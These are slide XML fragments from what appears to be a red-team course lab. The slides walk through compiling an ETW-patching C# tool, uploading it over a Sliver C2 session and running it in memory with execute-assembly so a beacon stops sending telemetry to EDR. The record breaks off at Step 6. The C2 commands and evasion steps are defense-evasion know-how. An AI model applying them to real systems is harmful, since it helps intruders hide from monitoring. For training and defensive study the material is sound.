          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 1: Create the ETW Patcher C# Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>On your Kali machine, create a file named </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ETWPatcher.cs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> with the following code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-2-Part-1-/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Explanation of the code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>NtSetInformationProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> is a native Windows API function exported by ntdll.dll.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessInformationClass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> parameter is set to 0x3B, which corresponds to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessTraceFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessInformation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> parameter is set to 0, which disables ETW for the process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The function returns 0 on success. Any other value indicates an error.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 2: Compile the C# Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Compile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ETWPatcher.cs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> into a .NET executable. You can use Visual Studio or the C# compiler (csc.exe).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>On Windows:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>csc /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>target:exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>out:ETWPatcher.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ETWPatcher.cs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>On Kali (using Mono):</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>mcs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>target:exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>out:ETWPatcher.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ETWPatcher.cs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33403243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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 3: Upload the Compiled Executable to the Target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Through your C2 session, upload ETWPatcher.exe to the target machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>In Sliver:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>upload /path/to/ETWPatcher.exe C:\temp\ETWPatcher.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 4: Execute the ETW Patcher via execute-assembly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Run the compiled .NET assembly directly in memory using your C2's execute-assembly command:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>In Sliver:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute-assembly C:\temp\ETWPatcher.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The code runs in the context of your current beacon process and disables ETW for that process. The console output will confirm whether the patch succeeded.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 5: Verify ETW Is Patched (Before and After)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Before applying the patch, list all active ETW traces:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>You will see a list of active event traces (e.g., Microsoft-Windows-Kernel-Process, Microsoft-Windows-Kernel-Network).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>After applying the patch, run the same command:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The traces will still be running. The difference is that your process is no longer feeding data into them. To confirm, run a process creation event and check if the EDR receives it.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17823115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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 6: Test with a Known Malicious Command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>To verify the ETW patch is working, execute a command that would normally generate telemetry (e.g., a process creation event):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
